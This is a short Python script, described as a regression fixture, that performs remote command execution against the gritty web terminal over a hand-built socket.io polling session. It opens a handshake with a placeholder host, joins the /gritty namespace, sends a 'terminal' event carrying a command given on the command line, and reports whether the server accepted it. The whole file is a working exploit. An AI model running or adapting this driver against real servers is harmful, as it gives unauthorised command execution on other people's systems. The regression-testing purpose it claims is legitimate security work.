"""Minimal FastX gritty polling-RCE driver (regression fixture).

Hand-rolled Engine.IO polling session against the default namespace,
terminal event carrying a caller-chosen command, accept verdict check.
"""
import json
import sys
import urllib.request

NS = "/gritty"
BASE = "https://target.example:3300"

opts = {"cmd": sys.argv[1] if len(sys.argv) > 1 else "id"}

opener = urllib.request.build_opener()
hs = opener.open("%s/socket.io/?EIO=3&transport=polling" % BASE)
sid = json.loads(hs.read().decode())["sid"]
poll = "%s/socket.io/?EIO=3&transport=polling&sid=%s" % (BASE, sid)

join = "40" + NS + ","
opener.open(urllib.request.Request(
    poll, method="POST", data=("%d:%s" % (len(join), join)).encode()))

payload = {"command": opts["cmd"], "cols": 80, "rows": 24}
body = "42" + NS + "," + json.dumps(["terminal", payload])
opener.open(urllib.request.Request(
    poll, method="POST", data=("%d:%s" % (len(body), body)).encode()))

tx = opener.open(poll).read().decode()
print("accepted:", '["accept"' in tx)
